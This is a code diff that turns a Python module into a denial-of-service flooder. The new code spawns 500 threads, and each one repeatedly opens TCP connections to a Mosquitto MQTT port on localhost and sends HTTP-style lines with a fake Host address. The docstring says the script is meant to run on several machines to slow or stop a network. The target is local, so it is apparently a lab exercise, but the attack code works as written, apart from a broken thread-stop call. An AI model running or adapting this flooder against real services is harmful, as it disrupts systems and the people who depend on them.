@@ -1,19 +1,39 @@
 """
-This module launches a POST request with legitimate machine data on a loop to simulate a DDOS attack
-when used by multiple computers
+This module sends packets on a loop to mosquittos ip and port, used on multiple machiches
+should assemble a distributed denial of service attack which slows down or stops the
+network entirely
 """
-import json
-import requests
+
+import socket
+import threading
+
+
+def attack(target, fake_ip, port):
+    """ Sends packets in a loop to given IP """
+    while True:
+        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        skt.connect((target, port))
+        skt.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
+                   (target, port))
+        skt.sendto(
+            ("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        skt.close()
+
 
 def main():
-    """ Launch POST loop """
-    machine_request = requests.get("http://localhost:8000/machine1", headers={
-        "User-Agent":
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"
-        })
-    machine_json = machine_request.json()
-    while True:
-        requests.post('http://localhost:8000/fault', json.dumps(machine_json))
+    """ Entry function """
+    target = 'localhost'
+    fake_ip = '182.21.20.32'
+    port = 1883
+    threads = []
+    for _ in range(500):
+        thread = threading.Thread(target=lambda: attack(target, fake_ip, port))
+        thread.start()
+        threads.append(thread)
+
+    for i in range(500):
+        threads[i].stop()
+
 
 if __name__ == '__main__':
     main()
